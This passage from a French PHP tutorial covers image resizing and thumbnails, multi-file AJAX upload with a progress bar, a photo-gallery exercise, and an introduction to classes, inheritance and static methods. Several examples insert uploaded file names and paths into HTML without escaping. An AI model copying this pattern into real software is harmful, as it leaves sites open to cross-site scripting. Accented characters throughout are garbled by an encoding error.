        if (!$hauteurMax) $hauteurMax = $largeurMax;
        
        // Obtenir les informations de l'image
        $infoImage = getimagesize($cheminSource);
        if (!$infoImage) return false;
        
        $largeurOriginale = $infoImage[0];
        $hauteurOriginale = $infoImage[1];
        $typeImage = $infoImage[2];
        
        // Calculer les nouvelles dimensions
        $ratio = min($largeurMax / $largeurOriginale, $hauteurMax / $hauteurOriginale);
        $nouvelleLargeur = (int)($largeurOriginale * $ratio);
        $nouvelleHauteur = (int)($hauteurOriginale * $ratio);
        
        // Cr√©er l'image source selon le type
        switch ($typeImage) {
            case IMAGETYPE_JPEG:
                $imageSource = imagecreatefromjpeg($cheminSource);
                break;
            case IMAGETYPE_PNG:
                $imageSource = imagecreatefrompng($cheminSource);
                break;
            case IMAGETYPE_GIF:
                $imageSource = imagecreatefromgif($cheminSource);
                break;
            default:
                return false;
        }
        
        if (!$imageSource) return false;
        
        // Cr√©er la nouvelle image
        $nouvelleImage = imagecreatetruecolor($nouvelleLargeur, $nouvelleHauteur);
        
        // Pr√©server la transparence pour PNG et GIF
        if ($typeImage == IMAGETYPE_PNG || $typeImage == IMAGETYPE_GIF) {
            imagealphablending($nouvelleImage, false);
            imagesavealpha($nouvelleImage, true);
            $transparent = imagecolorallocatealpha($nouvelleImage, 255, 255, 255, 127);
            imagefill($nouvelleImage, 0, 0, $transparent);
        }
        
        // Redimensionner
        imagecopyresampled(
            $nouvelleImage, $imageSource,
            0, 0, 0, 0,
            $nouvelleLargeur, $nouvelleHauteur,
            $largeurOriginale, $hauteurOriginale
        );
        
        // Sauvegarder selon le type
        $resultat = false;
        switch ($typeImage) {
            case IMAGETYPE_JPEG:
                $resultat = imagejpeg($nouvelleImage, $cheminDestination, 85);
                break;
            case IMAGETYPE_PNG:
                $resultat = imagepng($nouvelleImage, $cheminDestination, 8);
                break;
            case IMAGETYPE_GIF:
                $resultat = imagegif($nouvelleImage, $cheminDestination);
                break;
        }
        
        // Nettoyer la m√©moire
        imagedestroy($imageSource);
        imagedestroy($nouvelleImage);
        
        return $resultat;
    }
    
    public function creerMiniature($cheminSource, $dossierMiniatures, $taille = 150) {
        $nomFichier = basename($cheminSource);
        $extension = pathinfo($nomFichier, PATHINFO_EXTENSION);
        $nomSansExtension = pathinfo($nomFichier, PATHINFO_FILENAME);
        
        $nomMiniature = $nomSansExtension . '_thumb.' . $extension;
        $cheminMiniature = rtrim($dossierMiniatures, '/') . '/' . $nomMiniature;
        
        // Cr√©er le dossier si n√©cessaire
        if (!is_dir($dossierMiniatures)) {
            mkdir($dossierMiniatures, 0755, true);
        }
        
        if ($this-&gt;redimensionner($cheminSource, $cheminMiniature, $taille, $taille)) {
            return $cheminMiniature;
        }
        
        return false;
    }
    
    public function uploaderImageAvecMiniature($fichier, $creerMiniature = true) {
        // Upload normal
        $resultat = $this-&gt;uploader($fichier);
        
        if ($resultat['succes'] && $creerMiniature) {
            // Cr√©er une miniature
            $dossierMiniatures = $this-&gt;dossierUpload . 'miniatures/';
            $cheminMiniature = $this-&gt;creerMiniature($resultat['chemin_complet'], $dossierMiniatures);
            
            if ($cheminMiniature) {
                $resultat['miniature'] = $cheminMiniature;
            }
        }
        
        return $resultat;
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $upload = new TraitementImage('uploads/images/', 5 * 1024 * 1024); // 5 MB max
    
    $resultat = $upload-&gt;uploaderImageAvecMiniature($_FILES['image']);
    
    if ($resultat['succes']) {
        echo "&lt;h3&gt;‚úÖ Image upload√©e avec succ√®s !&lt;/h3&gt;";
        echo "&lt;p&gt;&lt;strong&gt;Fichier :&lt;/strong&gt; " . $resultat['nom_fichier'] . "&lt;/p&gt;";
        echo "&lt;p&gt;&lt;strong&gt;Taille :&lt;/strong&gt; " . number_format($resultat['taille'] / 1024, 2) . " Ko&lt;/p&gt;";
        
        // Afficher l'image et sa miniature
        echo "&lt;div style='display: flex; gap: 20px; margin: 20px 0;'&gt;";
        echo "&lt;div&gt;";
        echo "&lt;h4&gt;Image originale :&lt;/h4&gt;";
        echo "&lt;img src='" . $resultat['chemin_complet'] . "' style='max-width: 300px; max-height: 300px;'&gt;";
        echo "&lt;/div&gt;";
        
        if (isset($resultat['miniature'])) {
            echo "&lt;div&gt;";
            echo "&lt;h4&gt;Miniature :&lt;/h4&gt;";
            echo "&lt;img src='" . $resultat['miniature'] . "' style='border: 1px solid #ddd;'&gt;";
            echo "&lt;/div&gt;";
        }
        echo "&lt;/div&gt;";
        
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h3&gt;‚ùå Erreurs d'upload :&lt;/h3&gt;";
        foreach ($resultat['erreurs'] as $erreur) {
            echo "&lt;p&gt;‚Ä¢ $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>16.5 Upload multiple et barre de progression</h3>
    
    <h4>Formulaire pour upload multiple :</h4>
    <pre><code>&lt;!-- upload_multiple.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Upload Multiple&lt;/title&gt;
    &lt;style&gt;
        .upload-zone {
            border: 2px dashed #ccc;
            border-radius: 10px;
            padding: 50px;
            text-align: center;
            background: #fafafa;
            cursor: pointer;
            transition: all 0.3s;
        }
        .upload-zone:hover {
            border-color: #007bff;
            background: #f0f8ff;
        }
        .file-list {
            margin: 20px 0;
        }
        .file-item {
            background: #f8f9fa;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: #28a745;
            width: 0%;
            transition: width 0.3s;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;üì§ Upload Multiple de Fichiers&lt;/h2&gt;
    
    &lt;form id="uploadForm" enctype="multipart/form-data"&gt;
        &lt;div class="upload-zone" onclick="document.getElementById('fichiers').click()"&gt;
            &lt;p&gt;üóÇÔ∏è &lt;strong&gt;Cliquez ici ou glissez vos fichiers&lt;/strong&gt;&lt;/p&gt;
            &lt;p&gt;Formats accept√©s : JPG, PNG, PDF, DOC (max 10 MB par fichier)&lt;/p&gt;
            &lt;input type="file" id="fichiers" name="fichiers[]" multiple style="display: none;" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx"&gt;
        &lt;/div&gt;
        
        &lt;div id="fileList" class="file-list"&gt;&lt;/div&gt;
        
        &lt;div id="progressContainer" style="display: none;"&gt;
            &lt;p&gt;Progression de l'upload :&lt;/p&gt;
            &lt;div class="progress-bar"&gt;
                &lt;div id="progressBar" class="progress-fill"&gt;&lt;/div&gt;
            &lt;/div&gt;
            &lt;p id="progressText"&gt;0% - 0/0 fichiers&lt;/p&gt;
        &lt;/div&gt;
        
        &lt;button type="button" id="uploadBtn" style="display: none; margin: 20px 0; padding: 15px 30px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;"&gt;
            üöÄ Lancer l'upload
        &lt;/button&gt;
    &lt;/form&gt;
    
    &lt;div id="results"&gt;&lt;/div&gt;
    
    &lt;script&gt;
        const fichiersInput = document.getElementById('fichiers');
        const fileList = document.getElementById('fileList');
        const uploadBtn = document.getElementById('uploadBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const results = document.getElementById('results');
        
        let fichiersSelectionnes = [];
        
        fichiersInput.addEventListener('change', function() {
            fichiersSelectionnes = Array.from(this.files);
            afficherFichiers();
        });
        
        function afficherFichiers() {
            fileList.innerHTML = '';
            
            if (fichiersSelectionnes.length === 0) {
                uploadBtn.style.display = 'none';
                return;
            }
            
            fichiersSelectionnes.forEach((fichier, index) =&gt; {
                const item = document.createElement('div');
                item.className = 'file-item';
                item.innerHTML = `
                    &lt;div&gt;
                        &lt;strong&gt;${fichier.name}&lt;/strong&gt;
                        &lt;small&gt;(${(fichier.size / 1024 / 1024).toFixed(2)} MB)&lt;/small&gt;
                    &lt;/div&gt;
                    &lt;button type="button" onclick="supprimerFichier(${index})"&gt;‚ùå&lt;/button&gt;
                `;
                fileList.appendChild(item);
            });
            
            uploadBtn.style.display = 'block';
        }
        
        function supprimerFichier(index) {
            fichiersSelectionnes.splice(index, 1);
            afficherFichiers();
        }
        
        uploadBtn.addEventListener('click', async function() {
            if (fichiersSelectionnes.length === 0) return;
            
            progressContainer.style.display = 'block';
            uploadBtn.disabled = true;
            results.innerHTML = '';
            
            let fichiersUploades = 0;
            const totalFichiers = fichiersSelectionnes.length;
            
            for (let i = 0; i &lt; fichiersSelectionnes.length; i++) {
                const fichier = fichiersSelectionnes[i];
                
                const formData = new FormData();
                formData.append('fichier', fichier);
                
                try {
                    const response = await fetch('upload_ajax.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    fichiersUploades++;
                    const pourcentage = Math.round((fichiersUploades / totalFichiers) * 100);
                    
                    progressBar.style.width = pourcentage + '%';
                    progressText.textContent = `${pourcentage}% - ${fichiersUploades}/${totalFichiers} fichiers`;
                    
                    // Afficher le r√©sultat
                    const resultDiv = document.createElement('div');
                    resultDiv.style.cssText = 'margin: 10px 0; padding: 10px; border-radius: 5px;';
                    
                    if (result.succes) {
                        resultDiv.style.background = '#d4edda';
                        resultDiv.innerHTML = `‚úÖ &lt;strong&gt;${fichier.name}&lt;/strong&gt; upload√© avec succ√®s`;
                    } else {
                        resultDiv.style.background = '#f8d7da';
                        resultDiv.innerHTML = `‚ùå &lt;strong&gt;${fichier.name}&lt;/strong&gt; : ${result.erreurs.join(', ')}`;
                    }
                    
                    results.appendChild(resultDiv);
                    
                } catch (error) {
                    console.error('Erreur upload:', error);
                }
            }
            
            uploadBtn.disabled = false;
            
            // R√©initialiser apr√®s quelques secondes
            setTimeout(() =&gt; {
                progressContainer.style.display = 'none';
                progressBar.style.width = '0%';
                fichiersSelectionnes = [];
                fileList.innerHTML = '';
                uploadBtn.style.display = 'none';
                fichiersInput.value = '';
            }, 3000);
        });
        
        // Gestion du drag & drop
        const uploadZone = document.querySelector('.upload-zone');
        
        uploadZone.addEventListener('dragover', (e) =&gt; {
            e.preventDefault();
            uploadZone.style.borderColor = '#007bff';
            uploadZone.style.background = '#f0f8ff';
        });
        
        uploadZone.addEventListener('dragleave', () =&gt; {
            uploadZone.style.borderColor = '#ccc';
            uploadZone.style.background = '#fafafa';
        });
        
        uploadZone.addEventListener('drop', (e) =&gt; {
            e.preventDefault();
            uploadZone.style.borderColor = '#ccc';
            uploadZone.style.background = '#fafafa';
            
            const files = Array.from(e.dataTransfer.files);
            fichiersSelectionnes = files;
            afficherFichiers();
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h4>Script PHP pour l'upload AJAX :</h4>
    <pre><code>&lt;?php
// upload_ajax.php
header('Content-Type: application/json');

require_once 'TraitementImage.php'; // Inclure notre classe

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['fichier'])) {
        throw new Exception('Aucun fichier re√ßu');
    }
    
    $upload = new TraitementImage('uploads/', 10 * 1024 * 1024); // 10 MB max
    $resultat = $upload-&gt;uploader($_FILES['fichier']);
    
    if ($resultat['succes']) {
        // Optionnel : sauvegarder en base de donn√©es
        $pdo = connecterDB();
        $sql = "INSERT INTO fichiers_uploades (nom_original, nom_fichier, taille, type, date_upload) 
                VALUES (:nom_original, :nom_fichier, :taille, :type, NOW())";
        
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute([
            ':nom_original' =&gt; $_FILES['fichier']['name'],
            ':nom_fichier' =&gt; $resultat['nom_fichier'],
            ':taille' =&gt; $resultat['taille'],
            ':type' =&gt; $resultat['type']
        ]);
        
        echo json_encode([
            'succes' =&gt; true,
            'nom_fichier' =&gt; $resultat['nom_fichier'],
            'taille' =&gt; $resultat['taille']
        ]);
    } else {
        echo json_encode([
            'succes' =&gt; false,
            'erreurs' =&gt; $resultat['erreurs']
        ]);
    }
    
} catch (Exception $e) {
    echo json_encode([
        'succes' =&gt; false,
        'erreurs' =&gt; [$e-&gt;getMessage()]
    ]);
}
?&gt;</code></pre>

    <h3>16.6 Exercice pratique : Galerie photos compl√®te</h3>
    
    <p><strong>Objectif :</strong> Cr√©er une galerie photos avec upload s√©curis√©, miniatures et organisation par albums.</p>
    
    <p><strong>Fonctionnalit√©s √† impl√©menter :</strong></p>
    <ol>
        <li>Upload multiple d'images avec validation</li>
        <li>Cr√©ation automatique de miniatures</li>
        <li>Organisation par albums</li>
        <li>Affichage en galerie responsive</li>
        <li>Suppression s√©curis√©e</li>
        <li>Recherche par nom/date</li>
    </ol>

    <details>
        <summary><strong>üí° Voir la structure de solution</strong></summary>
        <pre><code>Structure de la galerie :
‚îú‚îÄ‚îÄ config.php
‚îú‚îÄ‚îÄ classes/
‚îÇ   ‚îú‚îÄ‚îÄ UploadSecurise.php
‚îÇ   ‚îú‚îÄ‚îÄ TraitementImage.php
‚îÇ   ‚îî‚îÄ‚îÄ GestionnaireGalerie.php
‚îú‚îÄ‚îÄ uploads/
‚îÇ   ‚îú‚îÄ‚îÄ originales/
‚îÇ   ‚îî‚îÄ‚îÄ miniatures/
‚îú‚îÄ‚îÄ galerie.php (affichage)
‚îú‚îÄ‚îÄ upload.php (formulaire)
‚îú‚îÄ‚îÄ traiter_upload.php
‚îú‚îÄ‚îÄ supprimer.php
‚îî‚îÄ‚îÄ admin.php (gestion)

Table SQL :
CREATE TABLE photos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    nom_original VARCHAR(255),
    nom_fichier VARCHAR(255),
    album VARCHAR(100),
    description TEXT,
    taille INT,
    largeur INT,
    hauteur INT,
    date_upload TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

Exemple GestionnaireGalerie.php :
&lt;?php
class GestionnaireGalerie extends TraitementImage {
    private $pdo;
    
    public function __construct($pdo) {
        parent::__construct('uploads/originales/');
        $this-&gt;pdo = $pdo;
    }
    
    public function ajouterPhoto($fichier, $album = 'general', $description = '') {
        $resultat = $this-&gt;uploaderImageAvecMiniature($fichier);
        
        if ($resultat['succes']) {
            // R√©cup√©rer les dimensions
            $infoImage = getimagesize($resultat['chemin_complet']);
            
            $sql = "INSERT INTO photos (nom_original, nom_fichier, album, description, 
                    taille, largeur, hauteur) VALUES (?, ?, ?, ?, ?, ?, ?)";
            
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                $fichier['name'],
                $resultat['nom_fichier'],
                $album,
                $description,
                $resultat['taille'],
                $infoImage[0],
                $infoImage[1]
            ]);
            
            $resultat['id'] = $this-&gt;pdo-&gt;lastInsertId();
        }
        
        return $resultat;
    }
    
    public function obtenirPhotos($album = null, $limite = 20, $page = 1) {
        $offset = ($page - 1) * $limite;
        
        if ($album) {
            $sql = "SELECT * FROM photos WHERE album = ? ORDER BY date_upload DESC LIMIT ? OFFSET ?";
            $params = [$album, $limite, $offset];
        } else {
            $sql = "SELECT * FROM photos ORDER BY date_upload DESC LIMIT ? OFFSET ?";
            $params = [$limite, $offset];
        }
        
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute($params);
        
        return $stmt-&gt;fetchAll();
    }
    
    public function obtenirAlbums() {
        $sql = "SELECT album, COUNT(*) as nb_photos FROM photos GROUP BY album ORDER BY album";
        return $this-&gt;pdo-&gt;query($sql)-&gt;fetchAll();
    }
    
    public function supprimerPhoto($id) {
        // R√©cup√©rer les infos du fichier
        $sql = "SELECT nom_fichier FROM photos WHERE id = ?";
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute([$id]);
        $photo = $stmt-&gt;fetch();
        
        if ($photo) {
            // Supprimer les fichiers physiques
            $cheminOriginal = 'uploads/originales/' . $photo['nom_fichier'];
            $cheminMiniature = 'uploads/miniatures/' . pathinfo($photo['nom_fichier'], PATHINFO_FILENAME) . '_thumb.' . pathinfo($photo['nom_fichier'], PATHINFO_EXTENSION);
            
            if (file_exists($cheminOriginal)) unlink($cheminOriginal);
            if (file_exists($cheminMiniature)) unlink($cheminMiniature);
            
            // Supprimer de la base
            $sql = "DELETE FROM photos WHERE id = ?";
            $stmt = $this-&gt;pdo-&gt;prepare($sql);
            return $stmt-&gt;execute([$id]);
        }
        
        return false;
    }
}
?&gt;</code></pre>
    </details>
</section>

<!-- Partie 17: Notions de programmation orient√©e objet (POO) -->
<section class="part17">
    <h2>17. Notions de programmation orient√©e objet (POO)</h2>
    
    <p>La <strong>Programmation Orient√©e Objet</strong> (POO) est comme organiser votre code en <strong>"bo√Ætes intelligentes"</strong> qui savent faire des choses sp√©cifiques. Imaginez une voiture : au lieu d'avoir des milliers de pi√®ces √©parpill√©es, tout est organis√© en syst√®mes (moteur, freins, direction...) qui fonctionnent ensemble !</p>

    <p>Nous avons d√©j√† utilis√© quelques classes dans les parties pr√©c√©dentes. Maintenant, apprenons √† cr√©er nos propres "bo√Ætes magiques" !</p>

    <h3>17.1 Qu'est-ce qu'une classe et un objet ?</h3>
    
    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>üèóÔ∏è Analogie avec l'architecture :</h4>
        <ul>
            <li><strong>Classe</strong> = Le plan de construction d'une maison</li>
            <li><strong>Objet</strong> = Une maison construite √† partir de ce plan</li>
            <li><strong>Propri√©t√©s</strong> = Les caract√©ristiques (couleur, nombre de pi√®ces...)</li>
            <li><strong>M√©thodes</strong> = Les actions possibles (ouvrir la porte, allumer la lumi√®re...)</li>
        </ul>
    </div>

    <h4>Premi√®re classe simple :</h4>
    <pre><code>&lt;?php
class Voiture {
    // Propri√©t√©s (caract√©ristiques)
    public $marque;
    public $modele;
    public $couleur;
    public $vitesse = 0;
    
    // M√©thodes (actions)
    public function demarrer() {
        echo "üöó La $this-&gt;marque $this-&gt;modele d√©marre !&lt;br&gt;";
    }
    
    public function accelerer($vitesse) {
        $this-&gt;vitesse += $vitesse;
        echo "üèÉ Acc√©l√©ration ! Vitesse actuelle : {$this-&gt;vitesse} km/h&lt;br&gt;";
    }
    
    public function freiner() {
        $this-&gt;vitesse = 0;
        echo "üõë Arr√™t complet !&lt;br&gt;";
    }
    
    public function klaxonner() {
        echo "üìØ POUET POUET !&lt;br&gt;";
    }
}

// Cr√©er des objets (instances)
$maVoiture = new Voiture();
$maVoiture-&gt;marque = "Renault";
$maVoiture-&gt;modele = "Clio";
$maVoiture-&gt;couleur = "rouge";

$voitureAmi = new Voiture();
$voitureAmi-&gt;marque = "Peugeot";
$voitureAmi-&gt;modele = "208";
$voitureAmi-&gt;couleur = "bleu";

// Utiliser les m√©thodes
echo "&lt;h3&gt;üöó Test de ma voiture :&lt;/h3&gt;";
$maVoiture-&gt;demarrer();
$maVoiture-&gt;accelerer(50);
$maVoiture-&gt;accelerer(30);
$maVoiture-&gt;klaxonner();
$maVoiture-&gt;freiner();

echo "&lt;h3&gt;üöô Test de la voiture de mon ami :&lt;/h3&gt;";
$voitureAmi-&gt;demarrer();
$voitureAmi-&gt;accelerer(70);
$voitureAmi-&gt;freiner();
?&gt;</code></pre>

    <h3>17.2 Le constructeur - Initialiser intelligemment</h3>
    
    <p>Le <strong>constructeur</strong> est une m√©thode sp√©ciale qui s'ex√©cute automatiquement quand on cr√©e un objet. C'est comme l'installation initiale d'un appareil !</p>

    <h4>Classe avec constructeur :</h4>
    <pre><code>&lt;?php
class Personne {
    private $nom;
    private $prenom;
    private $age;
    private $email;
    
    // Constructeur - s'ex√©cute automatiquement
    public function __construct($nom, $prenom, $age, $email = null) {
        $this-&gt;nom = $nom;
        $this-&gt;prenom = $prenom;
        $this-&gt;age = $age;
        $this-&gt;email = $email;
        
        echo "üë§ Nouvelle personne cr√©√©e : $prenom $nom&lt;br&gt;";
    }
    
    // M√©thodes pour acc√©der aux propri√©t√©s priv√©es
    public function obtenirNomComplet() {
        return $this-&gt;prenom . " " . $this-&gt;nom;
    }
    
    public function obtenirAge() {
        return $this-&gt;age;
    }
    
    public function definirEmail($email) {
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this-&gt;email = $email;
            echo "üìß Email mis √† jour : $email&lt;br&gt;";
        } else {
            echo "‚ùå Email invalide !&lt;br&gt;";
        }
    }
    
    public function sePresenter() {
        $presentation = "Bonjour, je suis {$this-&gt;obtenirNomComplet()}, j'ai {$this-&gt;age} ans";
        if ($this-&gt;email) {
            $presentation .= " et mon email est {$this-&gt;email}";
        }
        echo $presentation . ".&lt;br&gt;";
    }
    
    public function avoirAnniversaire() {
        $this-&gt;age++;
        echo "üéÇ Joyeux anniversaire ! Nouvel √¢ge : {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Cr√©ation avec le constructeur
$personne1 = new Personne("Dupont", "Jean", 25, "jean.dupont@email.com");
$personne2 = new Personne("Martin", "Marie", 30); // Sans email

echo "&lt;h4&gt;Pr√©sentations :&lt;/h4&gt;";
$personne1-&gt;sePresenter();
$personne2-&gt;sePresenter();

echo "&lt;h4&gt;Actions :&lt;/h4&gt;";
$personne2-&gt;definirEmail("marie.martin@email.com");
$personne1-&gt;avoirAnniversaire();
?&gt;</code></pre>

    <h3>17.3 Visibilit√© : public, private, protected</h3>
    
    <p>En POO, on peut contr√¥ler qui a acc√®s √† quoi. C'est comme les <strong>niveaux de s√©curit√©</strong> dans un b√¢timent !</p>

    <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <h4>üîê Niveaux de visibilit√© :</h4>
        <ul>
            <li><strong>public</strong> üåê : Accessible de partout (hall d'accueil)</li>
            <li><strong>private</strong> üîí : Accessible uniquement dans la m√™me classe (bureau priv√©)</li>
            <li><strong>protected</strong> üõ°Ô∏è : Accessible dans la classe et ses enfants (bureau familial)</li>
        </ul>
    </div>

    <h4>Exemple avec diff√©rents niveaux :</h4>
    <pre><code>&lt;?php
class CompteBancaire {
    public $titulaire;           // Visible partout
    private $solde;              // Visible uniquement ici
    protected $numeroCompte;     // Visible ici et dans les classes enfants
    
    public function __construct($titulaire, $soldeInitial = 0) {
        $this-&gt;titulaire = $titulaire;
        $this-&gt;solde = $soldeInitial;
        $this-&gt;numeroCompte = $this-&gt;genererNumeroCompte();
        
        echo "üè¶ Compte cr√©√© pour $titulaire avec {$soldeInitial}‚Ç¨&lt;br&gt;";
    }
    
    // M√©thode publique pour consulter le solde
    public function consulterSolde() {
        return $this-&gt;solde;
    }
    
    // M√©thode publique pour d√©poser de l'argent
    public function deposer($montant) {
        if ($montant &gt; 0) {
            $this-&gt;solde += $montant;
            echo "üí∞ D√©p√¥t de {$montant}‚Ç¨. Nouveau solde : {$this-&gt;solde}‚Ç¨&lt;br&gt;";
            return true;
        } else {
            echo "‚ùå Montant invalide pour le d√©p√¥t&lt;br&gt;";
            return false;
        }
    }
    
    // M√©thode publique pour retirer de l'argent
    public function retirer($montant) {
        if ($montant &gt; 0 && $montant &lt;= $this-&gt;solde) {
            $this-&gt;solde -= $montant;
            echo "üí≥ Retrait de {$montant}‚Ç¨. Nouveau solde : {$this-&gt;solde}‚Ç¨&lt;br&gt;";
            return true;
        } else {
            echo "‚ùå Retrait impossible (montant invalide ou solde insuffisant)&lt;br&gt;";
            return false;
        }
    }
    
    // M√©thode priv√©e - ne peut √™tre appel√©e que depuis cette classe
    private function genererNumeroCompte() {
        return "FR" . rand(1000000000, 9999999999);
    }
    
    // M√©thode prot√©g√©e - accessible aux classes enfants
    protected function obtenirNumeroCompte() {
        return $this-&gt;numeroCompte;
    }
    
    // M√©thode pour transf√©rer vers un autre compte
    public function transferer($montant, $compteDestinataire) {
        if ($this-&gt;retirer($montant)) {
            $compteDestinataire-&gt;deposer($montant);
            echo "üîÑ Transfert de {$montant}‚Ç¨ vers {$compteDestinataire-&gt;titulaire}&lt;br&gt;";
            return true;
        }
        return false;
    }
}

// Utilisation
$compte1 = new CompteBancaire("Jean Dupont", 1000);
$compte2 = new CompteBancaire("Marie Martin", 500);

echo "&lt;h4&gt;üè¶ Op√©rations bancaires :&lt;/h4&gt;";

// Ces actions fonctionnent (m√©thodes publiques)
$compte1-&gt;deposer(200);
$compte1-&gt;retirer(150);
echo "Solde de Jean : " . $compte1-&gt;consulterSolde() . "‚Ç¨&lt;br&gt;";

// Transfert entre comptes
$compte1-&gt;transferer(300, $compte2);

echo "Solde final de Jean : " . $compte1-&gt;consulterSolde() . "‚Ç¨&lt;br&gt;";
echo "Solde final de Marie : " . $compte2-&gt;consulterSolde() . "‚Ç¨&lt;br&gt;";

// Ces actions ne fonctionnent PAS (propri√©t√©s/m√©thodes priv√©es)
// echo $compte1-&gt;solde;                    // Erreur !
// echo $compte1-&gt;genererNumeroCompte();    // Erreur !
?&gt;</code></pre>

    <h3>17.4 H√©ritage - Cr√©er des familles de classes</h3>
    
    <p>L'<strong>h√©ritage</strong> permet de cr√©er une nouvelle classe bas√©e sur une classe existante. C'est comme l'h√©r√©dit√© familiale : les enfants h√©ritent des caract√©ristiques des parents, mais peuvent avoir leurs propres sp√©cificit√©s !</p>

    <h4>Classe parent et classes enfants :</h4>
    <pre><code>&lt;?php
// Classe parent (g√©n√©rale)
class Animal {
    protected $nom;
    protected $age;
    protected $espece;
    
    public function __construct($nom, $age, $espece) {
        $this-&gt;nom = $nom;
        $this-&gt;age = $age;
        $this-&gt;espece = $espece;
        echo "üêæ Nouvel animal : $nom ($espece)&lt;br&gt;";
    }
    
    public function manger() {
        echo "üçΩÔ∏è {$this-&gt;nom} mange&lt;br&gt;";
    }
    
    public function dormir() {
        echo "üò¥ {$this-&gt;nom} dort&lt;br&gt;";
    }
    
    public function sePresenter() {
        echo "Je suis {$this-&gt;nom}, un(e) {$this-&gt;espece} de {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Classe enfant - h√©rite d'Animal
class Chien extends Animal {
    private $race;
    
    public function __construct($nom, $age, $race) {
        // Appeler le constructeur parent
        parent::__construct($nom, $age, "chien");
        $this-&gt;race = $race;
    }
    
    // Nouvelle m√©thode sp√©cifique aux chiens
    public function aboyer() {
        echo "üêï {$this-&gt;nom} aboie : WOOF WOOF !&lt;br&gt;";
    }
    
    public function jouer() {
        echo "üéæ {$this-&gt;nom} joue avec une balle !&lt;br&gt;";
    }
    
    // Red√©finir (override) une m√©thode parent
    public function sePresenter() {
        echo "Woof ! Je suis {$this-&gt;nom}, un {$this-&gt;race} de {$this-&gt;age} ans !&lt;br&gt;";
    }
}

class Chat extends Animal {
    private $couleurPelage;
    
    public function __construct($nom, $age, $couleurPelage) {
        parent::__construct($nom, $age, "chat");
        $this-&gt;couleurPelage = $couleurPelage;
    }
    
    public function miauler() {
        echo "üê± {$this-&gt;nom} miaule : MIAOU !&lt;br&gt;";
    }
    
    public function ronronner() {
        echo "üò∫ {$this-&gt;nom} ronronne... purrrrr&lt;br&gt;";
    }
    
    public function sePresenter() {
        echo "Miaou ! Je suis {$this-&gt;nom}, un chat {$this-&gt;couleurPelage} de {$this-&gt;age} ans&lt;br&gt;";
    }
}

// Utilisation
echo "&lt;h4&gt;üêæ Cr√©ation des animaux :&lt;/h4&gt;";
$chien = new Chien("Rex", 3, "Labrador");
$chat = new Chat("Minou", 2, "roux");

echo "&lt;h4&gt;üó£Ô∏è Pr√©sentations :&lt;/h4&gt;";
$chien-&gt;sePresenter();
$chat-&gt;sePresenter();

echo "&lt;h4&gt;üé≠ Actions communes :&lt;/h4&gt;";
$chien-&gt;manger();
$chat-&gt;manger();
$chien-&gt;dormir();
$chat-&gt;dormir();

echo "&lt;h4&gt;üé™ Actions sp√©cifiques :&lt;/h4&gt;";
$chien-&gt;aboyer();
$chien-&gt;jouer();
$chat-&gt;miauler();
$chat-&gt;ronronner();
?&gt;</code></pre>

    <h3>17.5 M√©thodes et propri√©t√©s statiques</h3>
    
    <p>Les √©l√©ments <strong>statiques</strong> appartiennent √† la classe elle-m√™me, pas aux objets individuels. C'est comme les <strong>r√®gles communes</strong> √† toute une famille !</p>

    <h4>Exemple avec une classe utilitaire :</h4>
    <pre><code>&lt;?php
class Mathematiques {
    // Propri√©t√© statique - partag√©e par toute la classe
    public static $nombreCalculs = 0;
    
    // Constante de classe
    const PI = 3.14159;
    
    // M√©thodes statiques - appelables sans cr√©er d'objet
    public static function additionner($a, $b) {
        self::$nombreCalculs++;
        return $a + $b;
    }
    
    public static function multiplier($a, $b) {
        self::$nombreCalculs++;
        return $a * $b;
    }
    
    public static function calculerAireCircle($rayon) {
        self::$nombreCalculs++;
        return self::PI * $rayon * $rayon;
    }
    
    public static function obtenirNombreCalculs() {
        return self::$nombreCalculs;
    }
    
    public static function factorielle($n) {
        self::$nombreCalculs++;
        
        if ($n &lt;= 1) {
            return 1;
        }
        
        return $n * self::factorielle($n - 1);
    }
}

class Convertisseur {
    // Conversions de temp√©rature
    public static function celsiusVersFahrenheit($celsius) {
        return ($celsius * 9/5) + 32;
    }
    
    public static function fahrenheitVersCelsius($fahrenheit) {
        return ($fahrenheit - 32) * 5/9;
    }
    
    // Conversions de distance
    public static function kmVersMiles($km) {
        return $km * 0.621371;
    }
    
    public static function milesVersKm($miles) {
        return $miles * 1.60934;
    }
}

// Utilisation des m√©thodes statiques (sans cr√©er d'objets)
echo "&lt;h4&gt;üßÆ Calculs math√©matiques :&lt;/h4&gt;";
echo "5 + 3 = " . Mathematiques::additionner(5, 3) . "&lt;br&gt;";
echo "7 √ó 4 = " . Mathematiques::multiplier(7, 4) . "&lt;br&gt;";
